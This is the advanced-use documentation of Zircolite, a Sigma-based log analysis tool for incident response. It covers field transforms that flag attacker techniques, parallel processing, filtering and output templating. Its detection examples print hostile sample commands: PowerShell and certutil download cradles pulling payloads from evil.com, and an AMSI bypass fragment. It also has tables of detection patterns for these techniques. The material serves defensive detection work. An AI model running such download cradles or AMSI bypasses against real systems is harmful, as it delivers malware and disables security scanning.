# Advanced Use

## Field Transforms

Zircolite includes a **field transform system** that allows automatic enrichment and transformation of log field values during processing. Transforms are defined in `config/fieldMappings.yaml` and execute Python code in a sandboxed environment using RestrictedPython.

### Overview

Transforms can:
- **Decode obfuscated data** (Base64, hex strings, URL encoding)
- **Extract IOCs** (URLs, IPs, domains, registry paths)
- **Detect attack indicators** (AMSI bypass, XOR encryption, shellcode patterns)
- **Enrich fields** (extract usernames, categorize ports, identify LOLBins)
- **Create alias fields** (add new fields without modifying originals)

### Enabling Transforms

Transforms require two settings in `fieldMappings.yaml`:

```yaml
transforms_enabled: true

enabled_transforms:
  # Auditd transforms (Linux)
  - proctitle
  - cmd
  
  # Base64 decoding
  # - CommandLine_b64decoded
  # - ScriptBlockText_b64decoded
  
  # Process analysis
  # - Image_LOLBinMatch
  # - Image_TyposquatDetect
  
  # Security hunting
  # - CommandLine_AMSIBypass
  # - CommandLine_DownloadCradle
```

Only transforms listed in `enabled_transforms` will run. Uncomment transforms you want to enable.

### Available Transforms

#### Auditd Transforms

| Field | Alias Field | Description |
|-------|-------------|-------------|
| `proctitle` | *(modifies original)* | Converts hex-encoded proctitle to ASCII |
| `cmd` | *(modifies original)* | Converts hex-encoded cmd to ASCII |

#### CommandLine Transforms

| Transform | Alias Field | Description |
|-----------|-------------|-------------|
| Base64 Decode | `CommandLine_b64decoded` | Decodes Base64 strings in command lines |
| Credential Extraction | `CommandLine_Extracted_Creds` | Extracts credentials from net/wmic/psexec commands |
| URL Extraction | `CommandLine_URLs` | Extracts HTTP/HTTPS/FTP URLs |
| XOR Detection | `CommandLine_XORIndicators` | Detects XOR operations and extracts keys |
| AMSI Bypass | `CommandLine_AMSIBypass` | Detects AMSI bypass techniques |
| Hex Strings | `CommandLine_HexStrings` | Finds and decodes hex-encoded strings |
| Env Var Obfuscation | `CommandLine_EnvVarObfuscation` | Detects environment variable abuse |
| Download Cradles | `CommandLine_DownloadCradle` | Identifies download cradle patterns |
| Evasion Techniques | `CommandLine_EvasionTechniques` | Detects process hollowing, injection, etc. |
| Registry Paths | `CommandLine_RegistryPaths` | Extracts registry key paths |

#### ScriptBlockText (PowerShell) Transforms

| Transform | Alias Field | Description |
|-----------|-------------|-------------|
| Base64 Decode | `ScriptBlockText_b64decoded` | Decodes Base64 in PowerShell scripts |
| Obfuscation Indicators | `ScriptBlockText_ObfuscationIndicators` | Detects char substitution, string concat, GzipStream, etc. |
| XOR Patterns | `ScriptBlockText_XORPatterns` | Detects XOR keys and patterns |
| .NET Reflection | `ScriptBlockText_ReflectionAbuse` | Detects reflection-based attacks |
| Shellcode Indicators | `ScriptBlockText_ShellcodeIndicators` | Detects shellcode execution patterns |
| Network IOCs | `ScriptBlockText_NetworkIOCs` | Extracts IPs, URLs, and domains |

#### Process and Image Transforms

| Field | Alias Field | Description |
|-------|-------------|-------------|
| `Image` | `Image_ExeName` | Extracts executable name from path |
| `Image` | `Image_LOLBinMatch` | Detects Living Off The Land Binaries |
| `Image` | `Image_TyposquatDetect` | Detects typosquatted process names (similar to legit Windows binaries) |
| `ParentImage` | `ParentImage_ExeName` | Extracts parent executable name |

#### User and Identity Transforms

| Field | Alias Field | Description |
|-------|-------------|-------------|
| `User` | `User_Name` | Extracts username without domain (from `DOMAIN\user` or `user@domain`) |
| `User` | `User_Domain` | Extracts domain from user field |

#### Network Transforms

| Field | Alias Field | Description |
|-------|-------------|-------------|
| `QueryName` | `QueryName_TLD` | Extracts TLD from DNS queries |
| `QueryName` | `QueryName_EntropyScore` | Entropy score for DGA detection |
| `QueryName` | `QueryName_TyposquatDetect` | Detects typosquatted official domains (gov, banks, tech) |
| `DestinationIp` | `DestinationIp_ObfuscationCheck` | Detects hex/octal/decimal IP obfuscation |
| `DestinationPort` | `DestinationPort_Category` | Categorizes ports (HTTP, SMB, RDP, METASPLOIT, etc.) |

#### File and Registry Transforms

| Field | Alias Field | Description |
|-------|-------------|-------------|
| `TargetFileName` | `TargetFileName_URLDecoded` | URL decodes file paths |
| `TargetObject` | `TargetObject_SuspiciousRegistry` | Identifies persistence registry keys (Run, Services, IFEO, COM) |
| `Payload` | `Payload_b64decoded` | Decodes Base64 in payload fields |
| `ServiceFileName` | `ServiceFileName_b64decoded` | Decodes Base64 in service file names |

#### Hash Transforms

| Field | Alias Field | Description |
|-------|-------------|-------------|
| `Hashes` | `Hash_MD5` | Extracts MD5 hash from Sysmon Hashes field |
| `Hashes` | `Hash_SHA256` | Extracts SHA256 hash from Sysmon Hashes field |

### Transform Output Values Reference

Transforms produce specific indicator values that can be used for filtering and hunting. Here's a reference of the values produced by each security transform:

#### `ScriptBlockText_ObfuscationIndicators` Values

| Value | Description |
|-------|-------------|
| `CHAR_SUBST` | Character substitution (e.g., `` `I`E`X ``) |
| `STR_CONCAT` | String concatenation (e.g., `'Inv'+'oke'`) |
| `JOIN_OP` | `-Join` operator obfuscation |
| `FORMAT_STR` | Format string obfuscation (`-f`) |
| `VAR_SUBST` | Variable substitution in strings (`${...}`) |
| `ENC_CMD` | Encoded command (`-enc`, `-encodedcommand`) |
| `GZIPSTREAM` | GzipStream compression |
| `FROMBASE64` | FromBase64String method |
| `IO_COMPRESSION` | IO.Compression namespace usage |
| `DEFLATESTREAM` | DeflateStream compression |
| `MEMORYSTREAM` | MemoryStream usage |

#### `CommandLine_DownloadCradle` Values

| Value | Description |
|-------|-------------|
| `DOWNLOADSTRING` | `DownloadString()` method |
| `DOWNLOADFILE` | `DownloadFile()` method |
| `DOWNLOADDATA` | `DownloadData()` method |
| `INVOKE_WEBREQUEST` | `Invoke-WebRequest` / `iwr` |
| `INVOKE_RESTMETHOD` | `Invoke-RestMethod` / `irm` |
| `WEBCLIENT` | WebClient class usage |
| `BITSTRANSFER` | BitsTransfer module |
| `CERTUTIL_DOWNLOAD` | Certutil with `-urlcache` |
| `BITSADMIN_DOWNLOAD` | Bitsadmin with `/transfer` |
| `CURL_WGET` | curl or wget usage |

#### `CommandLine_AMSIBypass` Values

| Value | Description |
|-------|-------------|
| `AMSI_REF` | Any AMSI reference |
| `AMSI_INIT_FAILED` | AmsiInitFailed bypass |
| `AMSI_CONTEXT` | amsiContext manipulation |
| `AMSI_SCAN_BUFFER` | AmsiScanBuffer bypass |
| `AMSI_REFLECTION` | Reflection-based AMSI bypass |
| `AMSI_DLL` | amsi.dll reference |

#### `CommandLine_EvasionTechniques` Values

| Value | Description |
|-------|-------------|
| `PROCESS_HOLLOWING` | NtUnmapViewOfSection / ZwUnmapViewOfSection |
| `REFLECTIVE_DLL` | ReflectiveLoader pattern |
| `TOKEN_MANIPULATION` | AdjustTokenPrivileges / SetThreadToken |
| `MEMORY_ALLOC` | VirtualAlloc / NtAlloc / ZwAlloc |
| `REMOTE_THREAD` | CreateRemoteThread |
| `SYSCALL` | Direct syscall / ntdll usage |
| `ETW_BYPASS` | ETW / NtTraceEvent bypass |

#### `ScriptBlockText_ShellcodeIndicators` Values

| Value | Description |
|-------|-------------|
| `EXEC_MEMORY_ALLOC` | VirtualAlloc with 0x40 (PAGE_EXECUTE_READWRITE) |
| `KERNEL32_REF` | kernel32.dll reference |
| `NTDLL_REF` | ntdll.dll reference |
| `CREATE_THREAD` | CreateThread call |
| `NOP_SLED` | NOP sled pattern (0x90, 0x90) |
| `MEMORY_COPY` | Marshal.Copy / RtlMoveMemory / CopyMemory |
| `POINTER_OP` | IntPtr / Marshal.AllocHGlobal |

#### `TargetObject_SuspiciousRegistry` Values

| Value | Description |
|-------|-------------|
| `RUN_KEY` | Run / RunOnce registry keys |
| `SERVICE_KEY` | Services registry keys |
| `IFEO` | Image File Execution Options |
| `APPINIT_DLLS` | AppInit_DLLs |
| `WINLOGON` | Winlogon registry keys |
| `COM_HIJACK` | CLSID / InProcServer (COM hijacking) |
| `SCHED_TASK` | Scheduled task cache |
| `SECURITY_POLICY` | Security policies |

#### `DestinationPort_Category` Values

| Value | Description |
|-------|-------------|
| `HTTP` | Port 80 |
| `HTTPS` | Port 443 |
| `SMB` | Port 445 |
| `RDP` | Port 3389 |
| `SSH` | Port 22 |
| `WINRM` | Ports 5985, 5986 |
| `METASPLOIT_DEFAULT` | Port 4444 |
| `ALT_HTTP` | Ports 8080, 8443 |
| `EPHEMERAL` | Ports 49152+ |

#### `Image_TyposquatDetect` Values

| Value | Description |
|-------|-------------|
| `TYPOSQUAT:<process>(HOMOGLYPH)` | Homoglyph substitution (0→o, 1→l/i, rn→m, vv→w) |
| `TYPOSQUAT:<process>(CHAR_ADD)` | Character addition at start/end |
| `TYPOSQUAT:<process>(CHAR_OMIT)` | Character omission |
| `TYPOSQUAT:<process>(CHAR_SWAP)` | Single character substitution |

**Processes monitored**: svchost, lsass, csrss, services, explorer, powershell, cmd, certutil, rundll32, chrome, and other high-value targets.

**False positive prevention**: The transform includes a comprehensive whitelist of ~100+ legitimate Windows executables (wevtutil, vssadmin, netstat, etc.) that will never be flagged, even if they have similar names to monitored processes.

#### `QueryName_TyposquatDetect` Values

| Value | Description |
|-------|-------------|
| `TYPOSQUAT_GOV_US:<domain>(...)` | US Government domain typosquat (irs, ssa, usps, fbi, etc.) |
| `TYPOSQUAT_GOV_UK:<domain>(...)` | UK Government domain typosquat (hmrc, nhs, dvla) |
| `TYPOSQUAT_GOV_EU:<domain>(...)` | EU Government domain typosquat |
| `TYPOSQUAT_BANK:<domain>(...)` | Banking/Finance domain typosquat (chase, paypal, etc.) |
| `TYPOSQUAT_CRYPTO:<domain>(...)` | Cryptocurrency domain typosquat (coinbase, binance) |
| `TYPOSQUAT_TECH:<domain>(...)` | Tech company domain typosquat (microsoft, google, apple) |
| `TYPOSQUAT_EMAIL:<domain>(...)` | Email provider domain typosquat (gmail, outlook) |
| `TYPOSQUAT_CLOUD:<domain>(...)` | Cloud service domain typosquat (office365, azure, aws) |
| `TYPOSQUAT_SECURITY:<domain>(...)` | Security vendor domain typosquat |
| `TYPOSQUAT_SHIPPING:<domain>(...)` | Shipping company domain typosquat (fedex, ups, dhl) |
| `SUSPICIOUS_TLD:<tld>` | Suspicious TLD combined with typosquat (tk, xyz, etc.) |

**Techniques detected**:
- `HOMOGLYPH` - Similar looking characters (0/o, 1/l/i, rn/m, vv/w)
- `CHAR_MANIP` - Character addition or removal
- `CHAR_SWAP` - Character substitution
- `AFFIX` - Prefix/suffix added to legitimate domain
- `EMBEDDED` - Legitimate domain embedded in longer string

### Transform Examples

#### Example 1: Detecting PowerShell Download Cradles

When processing a PowerShell command like:
```
powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://evil.com/mal.ps1')"
```

The `CommandLine_DownloadCradle` transform produces:
```
DOWNLOADSTRING|WEBCLIENT
```

And `CommandLine_URLs` extracts:
```
http://evil.com/mal.ps1
```

#### Example 2: XOR Key Detection

For a command containing XOR operations:
```powershell
$decoded = $bytes | ForEach-Object { $_ -bxor 0x35 }
```

The `ScriptBlockText_XORPatterns` transform detects:
```
XOR_KEY:0x35|XOR_LOOP|COMMON_XOR_KEY:0x35
```

#### Example 3: AMSI Bypass Detection

When AMSI bypass code is detected:
```powershell
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
```

The `CommandLine_AMSIBypass` transform flags:
```
AMSI_REF|AMSI_REFLECTION
```

#### Example 4: LOLBin Detection

For a process execution:
```
C:\Windows\System32\certutil.exe -urlcache -split -f http://evil.com/file.exe
```

The `Image_LOLBinMatch` transform identifies:
```
LOLBIN:certutil
```

#### Example 5: Detecting Compressed/Encoded PowerShell

For obfuscated PowerShell using compression:
```powershell
[IO.Compression.GzipStream]::new([IO.MemoryStream]::new([Convert]::FromBase64String($data)))
```

The `ScriptBlockText_ObfuscationIndicators` transform flags:
```
GZIPSTREAM|MEMORYSTREAM|FROMBASE64|IO_COMPRESSION
```

#### Example 6: Network IOC Extraction

For a script containing network indicators:
```powershell
$client.DownloadFile("http://192.168.1.100:8080/payload.exe", "C:\temp\payload.exe")
```

The `ScriptBlockText_NetworkIOCs` transform extracts:
```
IP:192.168.1.100|URL:http://192.168.1.100:8080/payload.exe
```

#### Example 7: Process Typosquatting Detection

When a malicious process tries to masquerade as a legitimate Windows binary:
```
C:\Users\Public\svch0st.exe
```

The `Image_TyposquatDetect` transform identifies:
```
TYPOSQUAT:svchost(HOMOGLYPH)
```

Other examples:
- `1sass.exe` → `TYPOSQUAT:lsass(HOMOGLYPH)`
- `chr0me.exe` → `TYPOSQUAT:chrome(HOMOGLYPH)`
- `svchosts.exe` → `TYPOSQUAT:svchost(CHAR_ADD)`
- `powersh3ll.exe` → `TYPOSQUAT:powershell(HOMOGLYPH)`

**Note**: Legitimate Windows tools like `wevtutil.exe` will NOT be flagged as typosquats of `certutil.exe` due to the built-in whitelist.

#### Example 8: Domain Typosquatting Detection

When DNS queries reveal potential phishing domains:
```
micros0ft-support.xyz
```

The `QueryName_TyposquatDetect` transform identifies:
```
TYPOSQUAT_TECH:microsoft(HOMOGLYPH,CHAR_SWAP)|SUSPICIOUS_TLD:xyz
```

Other examples:
- `paypa1.com` → `TYPOSQUAT_BANK:paypal(HOMOGLYPH)`
- `irs-gov.tk` → `TYPOSQUAT_GOV_US:irs(AFFIX)|SUSPICIOUS_TLD:tk`
- `arnazon.com` → `TYPOSQUAT_TECH:amazon(CHAR_SWAP)`
- `gooogle.com` → `TYPOSQUAT_TECH:google(CHAR_MANIP)`
- `nhs-uk.info` → `TYPOSQUAT_GOV_UK:nhs(AFFIX)`

### Querying Transform Results

Transform alias fields are stored in the database and can be queried with SQL or SIGMA rules:

```sql
-- Find commands with download cradles
SELECT * FROM logs WHERE CommandLine_DownloadCradle != ''

-- Find PowerShell with XOR operations
SELECT * FROM logs WHERE ScriptBlockText_XORPatterns LIKE '%XOR_KEY%'

-- Find AMSI bypass attempts
SELECT * FROM logs WHERE CommandLine_AMSIBypass LIKE '%AMSI%'

-- Find high-entropy DNS queries (potential DGA)
SELECT * FROM logs WHERE CAST(QueryName_EntropyScore AS REAL) > 75

-- Find typosquatted process names (masquerading)
SELECT * FROM logs WHERE Image_TyposquatDetect != ''

-- Find typosquatted government domains (phishing)
SELECT * FROM logs WHERE QueryName_TyposquatDetect LIKE '%GOV_%'

-- Find typosquatted banking domains
SELECT * FROM logs WHERE QueryName_TyposquatDetect LIKE '%BANK%'

-- Find domain typosquats with suspicious TLDs
SELECT * FROM logs WHERE QueryName_TyposquatDetect LIKE '%SUSPICIOUS_TLD%'
```

### Creating Custom Transforms

You can add custom transforms in `fieldMappings.yaml`:

```yaml
transforms:
  MyField:
    - info: "Description of transform"
      type: python
      code: |
        def transform(param):
            # Your Python code here
            # param contains the field value
            # Return the transformed value
            return transformed_value
      alias: true  # Create new field (true) or modify original (false)
      alias_name: "MyField_Transformed"
      source_condition:
        - evtx_input
        - json_input
      enabled: true
```

#### Available Modules in Transforms

The following modules are available in the sandboxed environment:
- `base64` - Base64 encoding/decoding
- `re` - Regular expressions
- `chardet` - Character encoding detection

#### Transform Best Practices

1. **Keep transforms fast** - They run on every matching event
2. **Return empty string on no match** - Makes filtering easier
3. **Use aliases for new data** - Don't modify original evidence
4. **Handle exceptions** - Return original value on error
5. **Limit output size** - Truncate long results

---

## Working with Large Datasets

Zircolite processes each log file separately in its own database by default, which reduces memory usage for large datasets.

### Automatic Processing Optimization

As of version 2.41.0, Zircolite automatically analyzes your workload and optimizes processing. When you run Zircolite with multiple files, it:

1. **Analyzes your files** - counts files, measures sizes, checks available RAM and CPU cores
2. **Selects optimal database mode** - unified (all files in one DB) vs. per-file (separate DB per file)
3. **Enables parallel processing** - when beneficial, automatically processes files in parallel with optimal worker count

```shell
# Auto-optimization happens by default
python3 zircolite.py --evtx ./logs/ --ruleset rules/rules_windows_sysmon.json

# Example output:
# [+] Analyzing workload...
#     [>] Files: 15 (250.3 MB total, avg 16.7 MB)
#     [>] System: 12.5 GB RAM available, 8 CPUs
#     [>] 📁 Database mode: PER-FILE
#         [i] Default mode - 15 files, 250.3 MB total
#     [>] ⚡ Parallel: ENABLED (4 workers)
```

#### Database Mode Selection Heuristics

The automatic mode selection uses the following rules:

| Condition | Mode Selected | Reason |
|-----------|---------------|--------|
| Single file | Per-file | No benefit from unified mode |
| Low RAM (<2 GB available) | Per-file | Safer for memory-constrained systems |
| Total data > Available RAM / 3 | Per-file | Avoid out-of-memory errors |
| Many small files (>10 files, avg <5 MB) | Unified | Less overhead, enables cross-file correlation |
| Few large files (<5 files, avg >50 MB) | Per-file | Memory efficient processing |
| High RAM (>8 GB) + multiple files | Unified | Faster overall processing |

#### Controlling Processing Mode

```shell
# Disable automatic mode selection (use default per-file mode)
python3 zircolite.py --evtx logs/ --ruleset rules.json --no-auto-mode

# Force unified database mode (enables cross-file rule correlation)
python3 zircolite.py --evtx logs/ --ruleset rules.json --unified-db

# Disable parallel processing
python3 zircolite.py --evtx logs/ --ruleset rules.json --no-parallel

# Set specific worker count
python3 zircolite.py --evtx logs/ --ruleset rules.json --parallel-workers 4
```

### Parallel Processing

Zircolite automatically enables parallel processing when it's beneficial. The parallel processor:

- **Calculates optimal workers** based on available memory, CPU cores, and file sizes
- **Monitors memory** during processing and can throttle if approaching limits
- **Uses threads** for I/O-bound EVTX parsing (process-based parallelism was deprecated due to compatibility issues)
- **Falls back to sequential** if parallel isn't beneficial (single file, low memory)

#### Parallel Processing Heuristics

| Condition | Parallel | Reason |
|-----------|----------|--------|
| Single file | Disabled | No benefit |
| Very low RAM (<1 GB) | Disabled | Safety |
| Memory per file > 60% usable RAM | Disabled | Prevent OOM |
| Multiple files + sufficient memory | Enabled | Faster processing |

#### Manual Parallel Configuration

```shell
# Set maximum workers
python3 zircolite.py --evtx logs/ --ruleset rules.json --parallel-workers 8

# Set memory threshold for throttling (default: 75%)
python3 zircolite.py --evtx logs/ --ruleset rules.json --parallel-memory-limit 80
```

### Streaming Mode

Zircolite includes a **streaming mode** (enabled by default) that combines extraction, flattening, and database insertion into a single pass.

#### How Streaming Mode Works

**Traditional Mode (multi-pass):**
1. Extract logs from EVTX → Write intermediate JSON files
2. Read JSON files → Flatten → Store in memory
3. Create database → Insert all events
4. Execute rules

**Streaming Mode (single-pass):**
1. Extract logs → Flatten immediately → Insert directly to database in batches
2. Execute rules

This eliminates intermediate file I/O and avoids double JSON parsing.

#### When Streaming Mode is Used

Streaming mode is **enabled by default** for most input types:
- EVTX files
- JSON/JSONL files
- JSON Array files
- XML logs
- Sysmon for Linux logs
- Auditd logs

Streaming mode is **automatically disabled** for:
- CSV input (`--csv-input`)
- EVTXtract input (`--evtxtract-input`)
- When using `--keepflat` (to save intermediate JSON)
- When using `--fieldlist`

#### Controlling Streaming Mode

```shell
# Force traditional mode (disable streaming)
python3 zircolite.py --evtx logs/ --ruleset rules.json --no-streaming
```

### Memory Usage

- Zircolite displays memory statistics (peak and average usage) at the end of each run.
- Memory tracking uses `psutil` if available.
- In per-file mode, each log file is processed in its own in-memory database, and the database is released after processing.

### Performance Optimizations

There are several ways to speed up Zircolite:

- Let automatic optimization do its work (enabled by default).
- Use [Filtering](#filtering) to process only relevant files.
- Use the `--no-recursion` option if you don't need recursive directory search.
- **Early event filtering** - Zircolite automatically skips events that won't match any rules based on Channel and EventID.
- For extreme cases with very large datasets, use GNU Parallel for external parallelization.

### Early Event Filtering

Zircolite includes an **early event filtering** mechanism that skips events before processing operations. This feature:

1. **Extracts Channel and EventID** values from all loaded rules
2. **Filters events early** - before flattening and database insertion
3. **Supports multiple log formats** - EVTX, JSON, XML, CSV, and more

The event filter uses configurable field paths to extract Channel and EventID from different log structures:
- Standard EVTX: `Event.System.Channel`, `Event.System.EventID`
- Pre-flattened JSON: `Channel`, `EventID`
- ECS/Elasticsearch: `winlog.channel`, `event.code`
- And many more (configurable in `config/fieldMappings.yaml`)

```shell
# Event filtering is enabled by default
# You'll see a log message like:
# [+] Event filter enabled: 15 channels, 45 eventIDs

# Disable event filtering if needed
python3 zircolite.py --evtx logs/ --ruleset rules.json --no-event-filter

# Apply filtering to non-Windows log sources too
python3 zircolite.py --evtx logs/ --ruleset rules.json --filter-all-sources
```

The event filter statistics are displayed in the summary panel after processing.

> [!NOTE]  
> There is an option to use an on-disk database instead of in-memory by using the `--ondiskdb <DB_NAME>` argument. This is useful for very large datasets but is slower. **Consider the alternatives below first.**

### Using GNU Parallel

> [!NOTE]  
> Zircolite now has built-in parallel processing that is enabled by default. The section below is only useful for advanced scenarios where you need external parallelization (e.g., processing across multiple machines or when you need separate output files per directory).

On Linux or macOS, you can use **GNU Parallel** to launch multiple Zircolite instances for advanced scenarios.

> [!NOTE]  
> On macOS, please use GNU find (`brew install findutils` will install `gfind`).

- **"DFIR Case Mode": One directory per computer/endpoint**

	This mode is useful when your evidence is stored per computer (one directory per computer containing all EVTX files for that computer). It will create one result file per computer in the current directory.

	```shell
	find <CASE_DIRECTORY> -maxdepth 1 -mindepth 1 -type d | \
		parallel --bar python3 zircolite.py -e {} \
		-r rules/rules_windows_sysmon_pysigma.json --outfile {/.}.json
	```
	
	One downside of this mode is that if you have fewer computer evidence directories than CPU cores, they will not all be used.

- **"WEF/WEC Mode": One Zircolite instance per EVTX**

	You can use this mode when you have a lot of aggregated EVTX files coming from multiple computers. This is generally the case when you use WEF/WEC and you recover the EVTX files from the collector. This mode will create one result file per EVTX.

	```shell
	find <CASE_DIRECTORY> -type f -name "*.evtx" \
		parallel -j -1 --progress python3 zircolite.py -e {} \
		-r rules/rules_windows_sysmon_pysigma.json --outfile {/.}.json
	```
	
	In this example, `-j -1` uses all cores but one. You can adjust the number of cores used with this argument.

## Keeping Data Used by Zircolite

**Zircolite** has several arguments that can be used to keep data used to perform Sigma detections: 

- `--dbfile <FILE>` allows you to export all the logs to a SQLite 3 database file. You can query the logs with SQL statements to find more things than what the Sigma rules could have found. When processing multiple files, each file gets its own database file with a unique name.
- `--keeptmp` allows you to keep the source logs (EVTX/Auditd/EVTXtract/XML...) converted in JSON format.
- `--keepflat` allows you to keep the source logs (EVTX/Auditd/EVTXtract/XML...) converted in a flattened JSON format.
- `--hashes` adds an xxhash64 hash of the original log line to each event, useful for deduplication and tracking.

## Filtering

Zircolite provides several filtering options to reduce processing time.

### File Filters

Some EVTX files are not used by SIGMA rules but can become quite large (a good example is `Microsoft-Windows-SystemDataArchiver%4Diagnostic.evtx`). If you use Zircolite with a directory as the input argument, all EVTX files will be converted, saved, and matched against the SIGMA rules. 

To speed up the detection process, you may want to use Zircolite on files matching or not matching a specific pattern. For that, you can use **filters** provided by the following command-line arguments:

- `-s` or `--select`: Select files partly matching the provided string (case insensitive).
- `-a` or `--avoid`: Exclude files partly matching the provided string (case insensitive).
- `-fp` or `--file-pattern`: Use a Python glob pattern for file selection.
- `--no-recursion`: Disable recursive directory search.

> [!NOTE]  
> When using both `--select` and `--avoid` arguments, the "select" argument is always applied first, and then the "avoid" argument is applied. So it is possible to exclude files from included files, but not the opposite.

- Only use EVTX files that contain "sysmon" in their names:

	```shell
	python3 zircolite.py --evtx logs/ --ruleset rules/rules_windows_sysmon_pysigma.json \
		--select sysmon
	```
- Exclude "Microsoft-Windows-SystemDataArchiver%4Diagnostic.evtx": 

	```shell
	python3 zircolite.py --evtx logs/ --ruleset rules/rules_windows_sysmon_pysigma.json \
		--avoid systemdataarchiver
	```

- Only use EVTX files with "operational" in their names but exclude "defender"-related logs:
	
	```shell
	python3 zircolite.py --evtx logs/ --ruleset rules/rules_windows_sysmon_pysigma.json \
	--select operational --avoid defender
	```

- Use a custom glob pattern to select specific files:

	```shell
	python3 zircolite.py --evtx logs/ --ruleset rules/rules_windows_sysmon_pysigma.json \
		--file-pattern "Security*.evtx"
	```

For example, the **Sysmon** ruleset available in the `rules` directory only uses the following channels (names have been shortened): *Sysmon, Security, System, Powershell, Defender, AppLocker, DriverFrameworks, Application, NTLM, DNS, MSExchange, WMI-Activity, TaskScheduler*. 

So if you use the Sysmon ruleset with the following rules, it should speed up Zircolite's execution: 

```shell
python3 zircolite.py --evtx logs/ --ruleset rules/rules_windows_sysmon_pysigma.json \
	--select sysmon --select security.evtx --select system.evtx \
	--select application.evtx --select Windows-NTLM --select DNS \
	--select powershell --select defender --select applocker \
	--select driverframeworks --select "msexchange management" \
	--select TaskScheduler --select WMI-activity
```

### Time Filters

Sometimes you only want to work on a specific time range to speed up analysis. With Zircolite, it is possible to filter on a specific time range using the `--after` and `--before` arguments and their respective shorter versions `-A` and `-B`. Please note that: 

- The filter will apply to the `SystemTime` field of each event.
- The `--after` and `--before` arguments can be used independently.
- The timestamps provided must have the following format: `YYYY-MM-DDTHH:MM:SS` (hours are in 24-hour format).

Examples: 

- Select all events between 2021-06-02 22:40:00 and 2021-06-02 23:00:00: 

	```shell
	python3 zircolite.py --evtx logs/ --ruleset rules/rules_windows_sysmon_pysigma.json \
		-A 2021-06-02T22:40:00 -B 2021-06-02T23:00:00
	```

- Select all events after 2021-06-01 12:00:00: 

	```shell
	python3 zircolite.py --evtx logs/ --ruleset rules/rules_windows_sysmon_pysigma.json \
		-A 2021-06-01T12:00:00
	```

### Rule Filters

Some rules can be noisy or slow on specific datasets (check [here](https://github.com/wagga40/Zircolite/tree/master/rules/README.md)), so it is possible to skip them by using the `-R` or `--rulefilter` argument. This argument can be used multiple times.

The filter will apply to the rule title. To avoid unexpected side effects, **comparison is case-sensitive**. For example, if you do not want to use all MSHTA-related rules: 

```shell
python3 zircolite.py --evtx logs/ \
	--ruleset rules/rules_windows_sysmon_pysigma.json \
	-R MSHTA
```

### Limit the Number of Detected Events

Sometimes SIGMA rules can be very noisy (and generate a lot of false positives), but you still want to keep them in your rulesets. It is possible to filter rules that return too many detected events with the option `--limit <MAX_NUMBER>`. **Please note that when using this option, the rules are not skipped—the results are just ignored.** However, this is useful when forwarding events to Splunk.

## Templating and Formatting

Zircolite provides a templating system based on Jinja2. It allows you to change the output format to suit your needs (Splunk or ELK integration, grep-able output, etc.). There are some templates available in the [Templates directory](https://github.com/wagga40/Zircolite/tree/master/templates) of the repository: Splunk, Timesketch, and more. To use the template system, use these arguments:

- `--template <template_filename>`
- `--templateOutput <output_filename>`

```shell
python3 zircolite.py --evtx sample.evtx  --ruleset rules/rules_windows_sysmon_pysigma.json \
--template templates/exportForSplunk.tmpl --templateOutput exportForSplunk.json
```

It is possible to use multiple templates if you provide a `--templateOutput` argument for each `--template` argument.

## Mini-GUI

![](pics/gui.jpg)


The Mini-GUI can be used completely offline. It allows the user to display and search results. It uses [DataTables](https://datatables.net/) and the [SB Admin 2 theme](https://github.com/StartBootstrap/startbootstrap-sb-admin-2). 

### Automatic Generation

As of Zircolite 2.1.0, the easiest way to use the Mini-GUI is to generate a package with the `--package` option. A ZIP file containing all the necessary data will be generated. Use `--package-dir` to specify the output directory:

```shell
python3 zircolite.py --evtx sample.evtx \
    --ruleset rules/rules_windows_sysmon_pysigma.json \
    --package --package-dir /path/to/output
```

### Manual Generation

You need to generate a `data.js` file with the `exportForZircoGui.tmpl` template, decompress the `zircogui.zip` file in the [gui](https://github.com/wagga40/Zircolite/tree/master/gui/) directory, and replace the `data.js` file in it with yours:

```shell
python3 zircolite.py --evtx sample.evtx 
	--ruleset rules/rules_windows_sysmon_pysigma.json \
	--template templates/exportForZircoGui.tmpl --templateOutput data.js
7z x gui/zircogui.zip
mv data.js zircogui/
```

Then simply open `index.html` in your favorite browser and click on a MITRE ATT&CK® category or an alert level.
  
> [!WARNING]  
> **The Mini-GUI was not built to handle large datasets.**

## Packaging Zircolite 

### PyInstaller

* Install Python 3.10+ on the same OS as the one you want to use Zircolite on.
* Install all dependencies: `pip3 install -r requirements.txt`
* Install PyInstaller: `pip3 install pyinstaller`
* In the root folder of Zircolite, type: `pyinstaller -c --onefile zircolite.py`
* The `dist` folder will contain the packaged app.

### Nuitka

* Install Python 3.10+ on the same OS as the one you want to use Zircolite on.
* Install all dependencies: `pip3 install -r requirements.txt`
* Install Nuitka: `pip3 install nuitka`
* In the root folder of Zircolite, type: `python3 -m nuitka --onefile zircolite.py`

> [!WARNING]  
> When packaging with PyInstaller or Nuitka, some antivirus programs may flag your package.

## Troubleshooting

### Debug Mode

Use `--debug` for detailed logging:

```shell
python3 zircolite.py --evtx sample.evtx --ruleset rules.json --debug
```

## Other Tools 

Some other tools (mostly untested) have included a way to run Zircolite: 

- [KAPE](https://www.kroll.com/en/services/cyber-risk/incident-response-litigation-support/kroll-artifact-parser-extractor-kape) has a module for Zircolite: [here](https://github.com/EricZimmerman/KapeFiles/tree/master/Modules/Apps/GitHub)
- [Velociraptor](https://github.com/Velocidex/velociraptor) has an artifact for Zircolite: [here](https://docs.velociraptor.app/exchange/artifacts/pages/windows.eventlogs.zircolite/)
